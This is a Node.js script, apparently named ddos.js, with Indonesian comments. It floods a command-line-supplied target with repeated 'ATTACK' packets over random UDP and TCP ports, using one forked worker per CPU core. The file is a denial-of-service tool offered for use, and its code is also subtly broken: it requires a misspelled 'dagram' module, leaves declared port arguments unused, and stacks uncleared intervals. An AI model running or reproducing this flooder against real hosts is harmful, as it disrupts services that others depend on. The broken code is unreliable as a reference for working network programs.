const net = require('net');
const dgram = require('dagram');
const child_process = require('child_process');
const os = require('os');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

const target = process.argv[2];
const time = process.argv[3];
const portTCP = process.argv[4];
const portUDP = process.argv[5];
const threads = 1000;
const udpChunkSize = Math.floor(Math.random() * 10) + 50;
const udpInterval = Math.floor(Math.random() * 10) + 50;
const tcpInterval = Math.floor(Math.random() * 10) + 50;
const udpThreadCount = Math.floor(Math.random() * 20) + 50;
const tcpThreadCount = Math.floor(Math.random() * 20) + 50;
const udpAddrList = [];
const tcpAddrList = [];

for (let i = 0; i < udpThreadCount; i++) {
  const port = Math.floor(Math.random() * 65535) + 1;
  udpAddrList.push(`${target}:${port}`);
}

for (let i = 0; i < tcpThreadCount; i++) {
  const port = Math.floor(Math.random() * 65535) + 1;
  tcpAddrList.push(`${target}:${port}`);
}

if (cluster.isMaster) {
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
} else {
  let isDone = false;
  const handle = setInterval(() => {
    if (!isDone) {
      const randomUDPAddr = udpAddrList[Math.floor(Math.random() * udpAddrList.length)];
      const clientUDP = dgram.createSocket('udp4');
      clientUDP.send('ATTACK'.repeat(udpChunkSize), 0, 'ATTACK'.length * udpChunkSize, randomUDPAddr.split(':')[1], randomUDPAddr.split(':')[0], () => {
        setTimeout(() => {
          clientUDP.close();
        }, udpInterval);
        setInterval(() => {
          clientUDP.send('ATTACK'.repeat(udpChunkSize), 0, 'ATTACK'.length * udpChunkSize, randomUDPAddr.split(':')[1], randomUDPAddr.split(':')[0]);
        }, udpInterval);
      });

      const randomTCPAddr = tcpAddrList[Math.floor(Math.random() * tcpAddrList.length)];
      const clientTCP = new net.Socket();
      clientTCP.connect(randomTCPAddr.split(':')[1], randomTCPAddr.split(':')[0], () => {
        console.log(`Memulai serangan TCP ke ${randomTCPAddr.split(':')[0]}:${randomTCPAddr.split(':')[1]}`);
        setTimeout(() => {
          isDone = true;
          clientTCP.destroy();
        }, time * 1000);
        setInterval(() => {
          clientTCP.write('ATTACK'.repeat(tcpInterval));
        }, tcpInterval);
      });
    } else {
      clearInterval(handle);
      process.exit();
    }
  }, 1000);
}

// Jalankan kode tersebut dengan `node ddos.js [target] [time] [port TCP]
